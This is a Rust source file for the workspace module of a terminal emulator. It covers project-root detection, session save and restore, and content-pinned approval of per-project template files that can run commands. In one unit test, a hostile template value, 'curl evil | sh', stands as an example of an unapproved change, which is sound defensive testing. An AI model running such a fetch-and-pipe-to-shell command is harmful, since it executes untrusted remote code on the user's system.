//! Workspaces: groups of tabs that belong to one project.
//!
//! This module holds the parts that do not need a window: finding which
//! project a folder belongs to, the saved-session format, and the record of
//! per-project template files the user has approved.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::layout::{Axis, Node, PaneId};

pub type WorkspaceId = u64;
pub type TabId = u64;

pub struct Workspace {
    pub id: WorkspaceId,
    pub name: String,
    /// The project folder (repository root) whose tabs gather here. `None`
    /// for the general workspace and for ones created by hand.
    pub root: Option<PathBuf>,
    /// Created by hand: tabs here stay put instead of following their
    /// folder to another workspace.
    pub manual: bool,
    /// The tab to show when switching back to this workspace.
    pub last_tab: Option<TabId>,
}

/// Name of the workspace for tabs that are not inside any project.
pub const GENERAL: &str = "general";

/// The project a folder belongs to: the nearest enclosing folder that
/// contains `.git` (a directory in a normal clone, a file in a worktree or
/// submodule).
pub fn project_root(directory: &Path) -> Option<PathBuf> {
    directory.ancestors().find(|folder| folder.join(".git").exists()).map(Path::to_path_buf)
}

pub fn root_name(root: &Path) -> String {
    root.file_name().map_or_else(|| "/".into(), |name| name.to_string_lossy().into_owned())
}

// ---- Saved session ----------------------------------------------------------

/// Everything needed to reopen the window as it was.
#[derive(Serialize, Deserialize, Debug, PartialEq, Default)]
pub struct Session {
    pub version: u32,
    /// Index of the workspace that was showing.
    pub active_workspace: usize,
    pub workspaces: Vec<SavedWorkspace>,
}

pub const SESSION_VERSION: u32 = 1;

#[derive(Serialize, Deserialize, Debug, PartialEq)]
pub struct SavedWorkspace {
    pub name: String,
    pub root: Option<PathBuf>,
    pub manual: bool,
    pub active_tab: usize,
    pub tabs: Vec<SavedTab>,
}

#[derive(Serialize, Deserialize, Debug, PartialEq)]
pub struct SavedTab {
    /// Title given by the user or a template.
    pub title: Option<String>,
    /// Kept in its workspace regardless of folder.
    pub pinned: bool,
    /// Which pane had focus, counting panes in reading order.
    pub focused: usize,
    pub layout: SavedNode,
}

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
#[serde(tag = "type", rename_all = "lowercase")]
pub enum SavedNode {
    Pane(SavedPane),
    Split {
        /// "horizontal" (side by side) or "vertical" (stacked).
        axis: String,
        ratio: f32,
        first: Box<SavedNode>,
        second: Box<SavedNode>,
    },
}

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone, Default)]
pub struct SavedPane {
    pub cwd: Option<PathBuf>,
    /// The command that was running, offered again on restore.
    pub command: Option<String>,
}

impl SavedNode {
    /// Records a layout tree, asking `describe` for each pane's details.
    pub fn from_node(node: &Node, describe: &impl Fn(PaneId) -> SavedPane) -> SavedNode {
        match node {
            Node::Leaf(id) => SavedNode::Pane(describe(*id)),
            Node::Split { axis, ratio, first, second } => SavedNode::Split {
                axis: match axis {
                    Axis::Horizontal => "horizontal".into(),
                    Axis::Vertical => "vertical".into(),
                },
                ratio: *ratio,
                first: Box::new(SavedNode::from_node(first, describe)),
                second: Box::new(SavedNode::from_node(second, describe)),
            },
        }
    }

    /// Rebuilds a layout tree, asking `spawn` to create each pane. A pane
    /// that cannot be created is left out and its sibling takes the space.
    pub fn to_node(&self, spawn: &mut impl FnMut(&SavedPane) -> Option<PaneId>) -> Option<Node> {
        match self {
            SavedNode::Pane(pane) => spawn(pane).map(Node::Leaf),
            SavedNode::Split { axis, ratio, first, second } => {
                let axis = if axis == "vertical" { Axis::Vertical } else { Axis::Horizontal };
                match (first.to_node(spawn), second.to_node(spawn)) {
                    (Some(first), Some(second)) => Some(Node::Split {
                        axis,
                        ratio: if ratio.is_finite() { ratio.clamp(0.1, 0.9) } else { 0.5 },
                        first: Box::new(first),
                        second: Box::new(second),
                    }),
                    (Some(only), None) | (None, Some(only)) => Some(only),
                    (None, None) => None,
                }
            }
        }
    }
}

/// Folder for files the app writes for itself (session, approvals), next
/// to the config file.
pub fn state_dir() -> Option<PathBuf> {
    Some(ale_config::config_path()?.parent()?.join("state"))
}

fn write_private(path: &Path, contents: &str) -> std::io::Result<()> {
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir)?;
    }
    // Write to a temporary file and rename, so a crash mid-write cannot
    // leave a half-written file behind.
    let temporary = path.with_extension("tmp");
    std::fs::write(&temporary, contents)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&temporary, std::fs::Permissions::from_mode(0o600))?;
    }
    std::fs::rename(temporary, path)
}

impl Session {
    pub fn save(&self, dir: &Path) -> std::io::Result<()> {
        let json = serde_json::to_string_pretty(self).map_err(std::io::Error::other)?;
        write_private(&dir.join("session.json"), &json)
    }

    /// Loads the saved session. Anything unreadable, or written by an
    /// incompatible version, counts as "no session".
    pub fn load(dir: &Path) -> Option<Session> {
        let text = std::fs::read_to_string(dir.join("session.json")).ok()?;
        let session: Session = serde_json::from_str(&text).ok()?;
        (session.version == SESSION_VERSION && !session.workspaces.is_empty()).then_some(session)
    }
}

// ---- Approved project files -------------------------------------------------

/// Remembers which per-project template files the user has allowed to run
/// commands.
///
/// The approval is tied to the file's exact contents: if the file changes
/// (say, after pulling someone else's commit), ale-term asks again. Without
/// this, cloning a repository could be enough to run its commands.
#[derive(Serialize, Deserialize, Default, Debug, PartialEq)]
pub struct Approvals {
    /// Project root -> the approved file contents.
    approved: HashMap<PathBuf, String>,
}

impl Approvals {
    pub fn load(dir: &Path) -> Approvals {
        std::fs::read_to_string(dir.join("approved.json"))
            .ok()
            .and_then(|text| serde_json::from_str(&text).ok())
            .unwrap_or_default()
    }

    pub fn is_approved(&self, root: &Path, contents: &str) -> bool {
        self.approved.get(root).is_some_and(|approved| approved == contents)
    }

    pub fn approve(&mut self, root: &Path, contents: &str, dir: &Path) -> std::io::Result<()> {
        self.approved.insert(root.to_path_buf(), contents.to_owned());
        let json = serde_json::to_string_pretty(self).map_err(std::io::Error::other)?;
        write_private(&dir.join("approved.json"), &json)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_dir(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("ale-term-ws-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn project_root_is_the_nearest_folder_with_git() {
        let dir = temp_dir("root");
        std::fs::create_dir_all(dir.join("repo/.git")).unwrap();
        std::fs::create_dir_all(dir.join("repo/src/deep")).unwrap();
        // A nested worktree or submodule has a `.git` file, and wins.
        std::fs::create_dir_all(dir.join("repo/vendor/lib/src")).unwrap();
        std::fs::write(dir.join("repo/vendor/lib/.git"), "gitdir: elsewhere").unwrap();

        assert_eq!(project_root(&dir.join("repo/src/deep")), Some(dir.join("repo")));
        assert_eq!(project_root(&dir.join("repo")), Some(dir.join("repo")));
        assert_eq!(project_root(&dir.join("repo/vendor/lib/src")), Some(dir.join("repo/vendor/lib")));
        // Our temp dir may itself sit inside a repository; only check that
        // a folder outside `repo` does not resolve to it.
        assert_ne!(project_root(&dir), Some(dir.join("repo")));
        let _ = std::fs::remove_dir_all(dir);
    }

    fn sample_tree() -> Node {
        let mut root = Node::Leaf(1);
        root.split(1, Axis::Horizontal, 2);
        root.split(2, Axis::Vertical, 3);
        root.set_ratio(0, 0.3);
        root
    }

    #[test]
    fn layout_survives_a_save_and_restore() {
        let describe = |id: PaneId| SavedPane { cwd: Some(format!("/p{id}").into()), command: None };
        let saved = SavedNode::from_node(&sample_tree(), &describe);

        // Restoring hands out new pane ids in reading order.
        let mut next = 10;
        let mut seen = Vec::new();
        let restored = saved
            .to_node(&mut |pane| {
                seen.push(pane.cwd.clone().unwrap());
                next += 1;
                Some(next)
            })
            .unwrap();
        assert_eq!(seen, [PathBuf::from("/p1"), "/p2".into(), "/p3".into()]);
        assert_eq!(restored.panes(), [11, 12, 13]);
        // Same shape and ratios as the original, with the new ids.
        let mut expected = Node::Leaf(11);
        expected.split(11, Axis::Horizontal, 12);
        expected.split(12, Axis::Vertical, 13);
        expected.set_ratio(0, 0.3);
        assert_eq!(restored, expected);
    }

    #[test]
    fn panes_that_fail_to_start_are_dropped() {
        let saved = SavedNode::from_node(&sample_tree(), &|_| SavedPane::default());
        let mut count = 0;
        let restored = saved.to_node(&mut |_| {
            count += 1;
            (count != 2).then_some(count)
        });
        assert_eq!(restored.unwrap().panes(), [1, 3]);
        assert_eq!(saved.to_node(&mut |_| None), None);
    }

    #[test]
    fn session_file_round_trips_and_bad_files_are_ignored() {
        let dir = temp_dir("session");
        assert_eq!(Session::load(&dir), None);

        let session = Session {
            version: SESSION_VERSION,
            active_workspace: 0,
            workspaces: vec![SavedWorkspace {
                name: "shop".into(),
                root: Some("/code/shop".into()),
                manual: false,
                active_tab: 0,
                tabs: vec![SavedTab {
                    title: Some("agent".into()),
                    pinned: false,
                    focused: 1,
                    layout: SavedNode::from_node(&sample_tree(), &|_| SavedPane {
                        cwd: Some("/code/shop".into()),
                        command: Some("claude".into()),
                    }),
                }],
            }],
        };
        session.save(&dir).unwrap();
        assert_eq!(Session::load(&dir), Some(session));

        std::fs::write(dir.join("session.json"), "{ not json").unwrap();
        assert_eq!(Session::load(&dir), None);
        std::fs::write(dir.join("session.json"), r#"{"version":999,"active_workspace":0,"workspaces":[]}"#).unwrap();
        assert_eq!(Session::load(&dir), None);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn approval_is_tied_to_the_exact_file_contents() {
        let dir = temp_dir("approve");
        let root = Path::new("/code/shop");
        let mut approvals = Approvals::load(&dir);
        assert!(!approvals.is_approved(root, "tabs = []"));

        approvals.approve(root, "tabs = []", &dir).unwrap();
        let reloaded = Approvals::load(&dir);
        assert!(reloaded.is_approved(root, "tabs = []"));
        // A changed file, or the same file elsewhere, needs a new approval.
        assert!(!reloaded.is_approved(root, "tabs = [{ command = \"curl evil | sh\" }]"));
        assert!(!reloaded.is_approved(Path::new("/code/other"), "tabs = []"));
        let _ = std::fs::remove_dir_all(dir);
    }
}
